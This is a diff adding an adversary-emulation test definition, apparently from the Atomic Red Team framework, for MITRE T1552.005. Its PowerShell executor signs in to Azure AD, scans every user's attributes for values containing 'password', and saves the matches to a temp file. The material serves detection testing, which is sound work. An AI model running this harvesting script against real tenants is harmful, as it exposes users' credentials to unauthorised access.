@@ -1,0 +1,45 @@
+attack_technique: T1552.005
+display_name: 'Unsecured Credentials: Cloud Instance Metadata API'
+atomic_tests:
+- name: Azure - Search Azure AD User Attributes for Passwords
+  description: |
+    This test uses the MSOnline Powershell module to retrieve all user attributes for a specified account, which can sometimes contain unsecured credentials. 
+    Upon successful execution, this test will scan all user attributes for any strings containing "password".
+    Those unsecured credentials will be output to a text file, as well as the account that they are associated with and the user attribute in which they were found. 
+    See: https://github.com/dafthack/CloudPentestCheatsheets/blob/master/cheatsheets/Azure.md
+  supported_platforms:
+  - azure-ad
+  input_arguments:
+    username:
+      description: Azure AD username
+      type: String
+      default: null
+    password:
+      description: Azure AD password
+      type: String
+      default: T1082Az
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      The MSOnline module must be installed.
+    prereq_command: |
+      if (get-command Get-MsolUser -erroraction silentlycontinue){exit 0} else {exit 1}
+    get_prereq_command: |
+      install-module MSOnline
+  executor:
+    command: |
+      import-module msonline
+      $Password = ConvertTo-SecureString -String "#{password}" -AsPlainText -Force
+      $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "#{username}", $Password
+      Connect-MsolService -Credential $Credential
+      $users = Get-MsolUser -All;
+      foreach($user in $users)
+      {$props = @();$user | Get-Member | foreach-object{$props+=$_.Name}; 
+      foreach($prop in $props)
+      {if($user.$prop -like "*password*")
+      {("[*]" + $user.UserPrincipalName + "[" + $prop + "]" + " : " + $user.$prop) | out-file -filepath $env:temp\T1552.005Test1.txt -append -force}}}
+      get-content -path $env:temp\T1552.005Test1.txt -erroraction silentlycontinue
+    cleanup_command: |
+      remove-item $env:temp\T1552.005Test1.txt -force -erroraction silentlycontinue
+    name: powershell
+    elevation_required: true
